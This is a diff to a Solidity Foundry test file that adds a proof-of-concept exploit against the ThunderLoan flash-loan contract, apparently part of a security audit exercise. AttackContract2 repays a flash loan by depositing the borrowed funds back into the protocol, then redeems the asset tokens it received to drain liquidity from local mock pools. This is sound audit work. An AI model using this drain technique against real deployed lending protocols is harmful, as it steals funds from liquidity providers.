@@ -152,6 +152,67 @@ contract ThunderLoanTest is BaseTest {
         console.log("Attack fee: ", attackFee);                                             // 214_167_600_932_190_305 :: 0.214167600932190305
         assert(attackFee < normalFeeCost);
     }
+
+    /*//////////////////////////////////////////////////////////////
+                            DRAIN LIQUIDITY
+    //////////////////////////////////////////////////////////////*/  
+
+    function test_DepositInsteadOfRepay() public {
+        // 1. Set up mocks
+        thunderLoan = new ThunderLoan();
+        tokenA = new ERC20Mock();
+        proxy = new ERC1967Proxy(address(thunderLoan), "");
+        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
+        address tswapPool = pf.createPool(address(tokenA));
+        thunderLoan = ThunderLoan(address(proxy));
+        thunderLoan.initialize(address(pf));
+
+        // 2. Fund TSwap
+        uint256 liquidityProviderTokenAmount = 100e18;
+        uint256 liquidityProviderWethAmount = 100e18;
+        uint256 liquidityProviderLPTokensAmount = 100e18;
+        // Fund and deposit
+        vm.startPrank(liquidityProvider);
+        weth.mint(liquidityProvider, liquidityProviderWethAmount);
+        weth.approve(address(tswapPool), liquidityProviderWethAmount);
+        tokenA.mint(liquidityProvider, liquidityProviderTokenAmount);
+        tokenA.approve(address(tswapPool), liquidityProviderTokenAmount);
+        BuffMockTSwap(tswapPool).deposit(liquidityProviderWethAmount, liquidityProviderLPTokensAmount, liquidityProviderTokenAmount, block.timestamp);
+        vm.stopPrank();
+
+        // 3. Fund ThunderLoan
+        uint256 liquidityProviderTokenAmountTL = 1000e18;
+        // Set allow
+        vm.prank(thunderLoan.owner());
+        thunderLoan.setAllowedToken(tokenA, true);
+        // Fund and deposit
+        vm.startPrank(liquidityProvider);
+        tokenA.mint(liquidityProvider, liquidityProviderTokenAmountTL);
+        tokenA.approve(address(thunderLoan), liquidityProviderTokenAmountTL);
+        thunderLoan.deposit(tokenA, liquidityProviderTokenAmountTL);
+        vm.stopPrank();
+
+        // 4. Take out a flashloan, deposit it into protocol
+        uint256 amountToSteal = 200e18;
+        AttackContract2 attackContract2 = new AttackContract2(address(tswapPool), address(thunderLoan), address(tokenA), address(address(thunderLoan.getAssetFromToken(tokenA))));
+
+        vm.startPrank(user);
+        // pay extra fees
+        tokenA.mint(address(attackContract2), 5e18);
+        uint256 attackContractStartingBalance = tokenA.balanceOf(address(attackContract2));
+        console.log("Attack Contract Starting balance:      ", tokenA.balanceOf(address(attackContract2)));
+        thunderLoan.flashloan(address(attackContract2), tokenA, amountToSteal, "");
+        vm.stopPrank();
+
+        // 5. Withdraw deposit
+        vm.startPrank(user);
+        attackContract2.stealLiquidity();
+        vm.stopPrank(); 
+        uint256 attackContractEndingBalance = tokenA.balanceOf(address(attackContract2));
+        console.log("Attack Contract Ending balance:        ", tokenA.balanceOf(address(attackContract2)));
+        
+        assert(attackContractEndingBalance > attackContractStartingBalance);
+    }
 }
 
 contract AttackContract is IFlashLoanReceiver {
@@ -188,4 +249,34 @@ contract AttackContract is IFlashLoanReceiver {
         }
     }
 
+}
+
+contract AttackContract2 is IFlashLoanReceiver {
+    ThunderLoan thunderLoan;
+    BuffMockTSwap tswapPool;
+    address tokenA;
+    address assetToken;
+
+    bool attacked = false;
+    uint256 public feeOne;
+    uint256 public feeTwo;
+
+    constructor(address _tswapPool, address _thunderLoanAddress, address _tokenA, address _assetToken) {
+        thunderLoan = ThunderLoan(_thunderLoanAddress);
+        tswapPool = BuffMockTSwap(_tswapPool);
+        tokenA = _tokenA;
+        assetToken = _assetToken;
+    }
+
+    function executeOperation(address token, uint256 amount, uint256 fee, address /*initiator*/, bytes calldata /*params*/) external returns(bool) {
+        //depoist amount + fee => Technically "repayed" but we get Asset tokens for depositing
+        IERC20(token).approve(address(thunderLoan), amount + fee);
+        thunderLoan.deposit(IERC20(token), amount + fee);
+    }
+
+    function stealLiquidity() public {
+        uint256 arg = IERC20(assetToken).balanceOf(address(this));
+        IERC20(assetToken).approve(address(thunderLoan), arg);
+        thunderLoan.redeem(IERC20(tokenA), arg);
+    }
 }
